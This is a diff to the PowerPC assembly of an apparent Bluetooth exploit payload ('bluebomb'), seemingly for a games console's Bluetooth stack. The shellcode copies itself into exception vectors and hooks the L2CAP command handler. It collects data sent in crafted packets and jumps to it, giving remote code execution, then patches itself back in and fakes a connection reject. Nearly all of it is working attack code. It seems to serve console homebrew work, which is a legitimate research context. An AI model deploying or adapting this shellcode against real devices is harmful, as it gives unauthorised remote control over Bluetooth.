@@ -1,4 +1,4 @@
-/*  Copyright 2019  Dexter Gerig  <dexgerig@gmail.com>
+/*  Copyright 2019-2020  Dexter Gerig  <dexgerig@gmail.com>
     
     This program is free software: you can redistribute it and/or modify
     it under the terms of the GNU General Public License as published by
@@ -14,38 +14,51 @@
     along with this program.  If not, see <https://www.gnu.org/licenses/>.
  */
 
+# Registers:
+# 15: l2cb
+# 16: our l2cap packet
+# 17: size of the data of the packet
+# 25: ID field of the packet
+
 	.globl _start
 _start:
-	nop # 0x0
-	nop # 0x4
-	b _realstart # 0x8
+	mflr 11 # 0x0
+	bl _realstart # 0x4
+payload_addr:
+	.long 0x00000000 # 0x8 Filled in by bluebomb before being sent
 	nop # 0xc Overwritten during exploit
 	
 _realstart:
-	# First we copy our selves to the empty interrupt execption vectors as a place to live without trashing something.
-	mr 4, 3
+	mflr 10
+	subi 10, 10, 0x8 # Get the _start
+	
+	# Now we copy our selves to the empty interrupt execption vectors as a place to live without trashing something.
+	mr 4, 10
 	lis 3, dest@h ; ori 3, 3, dest@l
 	lis 5, (_end - _start)@h ; ori 5, 5, (_end - _start)@l
 	bl memcpy
 	lis 4, (_end - _start)@h ; ori 4, 4, (_end - _start)@l
 	bl store_region
 	
-	# Patch ourselves into the switch statement
-	lis 3, switch_addr@h ; ori 3, 3, switch_addr@l
-	lis 4, jump_address@h ; ori 4, 4, jump_address@l
-	stw 4, 0(3)
+	# write the payload_addr to the payload_offset
+	lis 3, payload_addr@h ; ori 3, 3, payload_addr@l
+	lis 4, payload_offset@h ; ori 4, 4, payload_offset@l
+	lwz 5, 0(3)
+	stw 5, 0(4)
 	
-	# Return to the call as such
-	# l2cu_reject_connection(r15, 0, 0, 'S0')
+	# Return with 'S0'
 	li 6, 0x5330
-	b return_from_switch
+	b return_from_call
 
 jump_payload:
-	lis 6, payload_addr@h ; ori 6, 6, payload_addr@l
-	mtctr 6
+	lis 3, payload_addr@h ; ori 3, 3, payload_addr@l
+	lwz 3, 0(3)
+	mtctr 3
 	bctr
 
-jump_address:
+hook:
+	mflr 11
+	
 	# compare ID field of packet, 0 == append to payload, 1 == jump to payload
 	cmpwi 25, 1
 	beq jump_payload
@@ -65,18 +78,28 @@ jump_address:
 	mr 4, 17
 	bl store_region
 	
-	# Return to the call as such
-	# l2cu_reject_connection(r15, 0, 0, 'GD')
+	# return from the call with 'GD'
 	li 6, 0x4744
 	
-return_from_switch:
+return_from_call:
+	# Patch ourselves back in, this is unset whenever we are called so we have to do it.
+	# r15 is from process_l2cap_cmd and is a pointer to the l2cb
+	addi 3, 15, 0x54
+	lis 4, hook@h ; ori 4, 4, hook@l
+	stw 4, 0(3)
+	
+	# We just return onto a call to l2cu_reject_connection
+	# Since we have a pointer into process_l2cap_cmd we just
+	# subtract a offset to get to one of the calls
+	# To my knowledge there are no variations of this function
+	# so this should be fine to do.
 	mr 3, 15
 	li 4, 0
 	li 5, 0
-	# Prepare r6 before you jump here
-	lis 7, switch_break@h ; ori 7, 7, switch_break@l
-	mtctr 7
-	bctr
+	subi 11, 11, 0x07AC
+	
+	mtlr 11
+	blr
 
 store_region:
 	li 5, 31
@@ -106,6 +129,6 @@ memcpy:
 	blr
 
 payload_offset:
-	.long payload_addr
+	.long 0x00000000
 
 _end:
